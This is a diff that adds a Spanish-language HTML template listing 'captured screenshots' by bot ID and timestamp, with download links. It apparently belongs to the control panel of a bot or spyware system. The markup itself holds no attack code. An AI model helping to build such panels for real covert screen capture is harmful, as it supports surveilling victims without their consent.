@@ -1,0 +1,24 @@
+{% extends "base.html" %}
+
+{% block title %}Screenshots{% endblock %}
+
+{% block content %}
+<div class="section-header">
+    <h2><i class="fas fa-desktop"></i> Screenshots Capturadas ({{screenshots|length}})</h2>
+</div>
+
+<div class="image-grid">
+    {% for s in screenshots %}
+    <div class="image-card">
+        <img src="/static/screenshots/{{s.filename}}" alt="Screenshot {{s.id}}" loading="lazy">
+        <div class="info">
+            <p><i class="fas fa-robot"></i> {{s.bot_id}}</p>
+            <p><i class="fas fa-clock"></i> {{s.timestamp}}</p>
+            <a href="/static/screenshots/{{s.filename}}" download class="btn btn-sm">
+                <i class="fas fa-download"></i> Descargar
+            </a>
+        </div>
+    </div>
+    {% endfor %}
+</div>
+{% endblock %}
